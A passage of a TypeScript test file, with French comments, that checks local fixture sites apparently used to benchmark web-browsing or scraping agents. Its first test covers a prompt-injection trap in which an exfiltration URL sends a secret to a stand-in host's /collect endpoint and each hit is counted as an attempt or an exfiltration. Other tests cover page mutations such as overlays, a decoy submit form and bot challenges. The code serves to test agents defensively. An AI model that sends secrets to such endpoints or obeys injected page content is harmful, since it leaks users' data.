    expect(exfil).toMatch(new RegExp(`http://${BENCH_HOSTS.trap}:\\d+/collect\\?v=`));
    // Le piège journalise chaque requête (chemin et requête) : tentative, et exfiltration si la valeur secrète y figure.
    expect((await fx.get(BENCH_HOSTS.trap, '/collect?v=rien')).status).toBe(204);
    expect((await fx.get(BENCH_HOSTS.trap, `/collect?v=${BENCH_INJECTION_SECRET}`)).status).toBe(204);
    const log = obj(await setSite('bench_injection', { action: 'trap_log' }));
    const hits = (log['result'] as { hits: { path: string; query: string }[] }).hits;
    expect(hits).toHaveLength(2);
    expect(classifyTrapHits(hits)).toEqual({ attempts: 2, exfiltrations: 1 });
    await fx.reset();
    expect(((obj(await setSite('bench_injection', { action: 'trap_log' }))['result']) as { hits: unknown[] }).hits).toEqual([]);
  },

  async bench_steps() {
    const host = BENCH_HOSTS.steps;
    const contacts = benchStepsContacts();
    expect(contacts).toHaveLength(9);
    const pageOf = async (p: number): Promise<string> => (await fx.get(host, `/?p=${p}`)).body;
    const ids = (html: string): string[] => [...html.matchAll(/\((zz_test_person_\d{3})\)/g)].map((m) => m[1] ?? '');
    // Sans mutation : 3 contacts par page, indicateur, bouton « Suivant » sans href qui navigue par script.
    let first = await pageOf(1);
    expect(ids(first)).toEqual(contacts.slice(0, 3).map((c) => c.id));
    expect(first).toContain('Page 1 / 3');
    expect(first).toMatch(/<button type="button" id="next"[^>]*>Suivant<\/button>/);
    expect(ids(await pageOf(3))).toEqual(contacts.slice(6, 9).map((c) => c.id));
    const mutate = async (mutation: string): Promise<void> => {
      expect((await setSite('bench_steps', { mutation })).status, mutation).toBe(200);
    };
    await mutate('rename_label');
    first = await pageOf(1);
    expect(first).toMatch(/>Page suivante<\/button>/);
    expect(first).not.toMatch(/>Suivant<\/button>/);
    await mutate('move_element');
    expect(await pageOf(1)).toMatch(/<header>[\s\S]*id="next"[\s\S]*<\/header>[\s\S]*<ul id="list">/);
    await mutate('insert_overlay');
    expect(await pageOf(1)).toMatch(/<div class="zz-overlay" role="dialog"/);
    await mutate('duplicate_label');
    expect((await pageOf(1)).match(/>Suivant<\/button>/g)).toHaveLength(2);
    await mutate('inert_element');
    first = await pageOf(1);
    expect(first).toMatch(/id="next"/);
    expect(first).not.toContain('location.href');
    await mutate('stale_data');
    expect(ids(await pageOf(2))).toEqual(ids(await pageOf(1)));
    await mutate('challenge_midway');
    expect(ids(await pageOf(1))).toHaveLength(3);
    const midway = await pageOf(2);
    expect(midway).toContain('zz-test-challenge');
    expect(midway).not.toMatch(/<script|<form|captcha/i);
    await mutate('weaken_post');
    expect(await pageOf(2)).not.toContain('Page 2 / 3');
    await mutate('legit_empty');
    first = await pageOf(1);
    expect(ids(first)).toEqual([]);
    expect(first).toContain('Aucun contact');
    await mutate('insert_submit');
    expect(await pageOf(1)).toMatch(/<form method="post" action="\/confirm">/);
    expect(await count(host, '/confirm')).toBe(0);
    expect((await fx.call(host, 'POST', '/confirm')).status).toBe(303);
    expect(await count(host, '/confirm')).toBe(1);
    expect((await setSite('bench_steps', { mutation: 'inconnue' })).status).toBe(400);
    expect([...STEP_MUTATIONS]).toHaveLength(10);
  },

  // ------------------------------------------------------------------ cas de référence (gate M2, tests/cases)
  async books() {
    const host = H('books');
    const first = await fx.get(host, '/');
    expect(first.status).toBe(200);
    type Book = { sku: string; title: string; price: number };
    const books = (html: string): Book[] => (JSON.parse(blob(html, /<script id="__NEXT_DATA__" type="application\/json">([^<]+)<\/script>/)) as { props: { pageProps: { books: Book[] } } }).props.pageProps.books;
    expect(books(first.body)).toHaveLength(20);
    expect(first.body).toContain('rel="next" href="/catalogue/page-2.html"');
    const second = (await fx.get(host, '/catalogue/page-2.html')).body;
    expect(second).toContain('href="/catalogue/page-3.html"');
    const last = (await fx.get(host, '/catalogue/page-3.html')).body;
    expect(books(last)).toHaveLength(20);
    expect(last).not.toContain('rel="next"');
    expect(new Set([first.body, second, last].flatMap((h) => books(h).map((b) => b.sku))).size).toBe(60);
    expect(typeof books(first.body)[0]!.price).toBe('number');
    expect((await fx.get(host, '/catalogue/page-4.html')).status).toBe(404);
  },

  async search_guarded() {
    const host = H('search_guarded');
    expect((await fx.get(host, '/recherche?q=lampe')).body).toContain('/api/search?q=lampe&page=1');
    const page1 = obj(await fx.get(host, '/api/search?q=lampe&page=1'));
    expect((page1['ads'] as unknown[]).length).toBe(20);
    expect(page1['has_more']).toBe(true);
    const challenged = await fx.get(host, '/api/search?q=lampe&page=2');
    expect(challenged.status).toBe(403);
    expect(challenged.headers['x-zz-test-shield']).toBe('challenge');
    expect(challenged.body).toContain('zz-test-challenge');
    const hits = obj(await setSite('search_guarded', { action: 'page_hits' }));
    expect(hits['result']).toEqual({ '1': 1, '2': 1 });
  },
};

beforeAll(async () => {
  fx = await startClient();
});
afterAll(async () => {
  await fx.close();
});
beforeEach(async () => {
  await fx.reset();
});

describe('contrat par fixture', () => {
  for (const [id, run] of Object.entries(contracts)) it(`fixture ${id}`, run);

  it('chaque site du registre a un test de contrat, et inversement', async () => {
    const sites = ((await fx.json('127.0.0.1', '/__sites')) as { sites: { id: string }[] }).sites.map((s) => s.id);
    expect(Object.keys(contracts).sort()).toEqual(sites.sort());
  });
});

describe('contrats transverses', () => {
  it('robots.txt permissif par défaut sur les sites qui ne le servent pas eux-mêmes', async () => {
    for (const id of ['api_json', 'ssr', '503', 'challenge', '429', 'signed403']) {
      const res = await fx.get(H(id), '/robots.txt');
      expect(res.status, id).toBe(200);
      expect(res.body, id).toBe('User-agent: *\nDisallow:\n');
    }
  });

  it('aucune page de fumée ne charge de ressource hors .localhost', async () => {
    const sites = ((await fx.json('127.0.0.1', '/__sites')) as { sites: { hosts: string[]; smoke: { path: string } }[] }).sites;
    for (const site of sites) {
      const res = await fx.get(site.hosts[0] ?? '', site.smoke.path);
      const external = [...res.body.matchAll(/(?:src|href)="(https?:\/\/[^"]+)"/g)].map((m) => m[1] ?? '').filter((u) => !new URL(u).hostname.endsWith('.localhost'));
      expect(external, site.hosts[0]).toEqual([]);
    }
  });

  it('les fixtures de défi et de 403 n\'embarquent aucun mécanisme de résolution', async () => {
    for (const [id, path] of [['challenge', '/'], ['challenge_200', '/'], ['signed403', '/']] as const) {
      const res = await fx.get(H(id), path);
      expect(res.body, id).not.toMatch(/<script|<form|<iframe|eval\(|captcha/i);
    }
  });
});
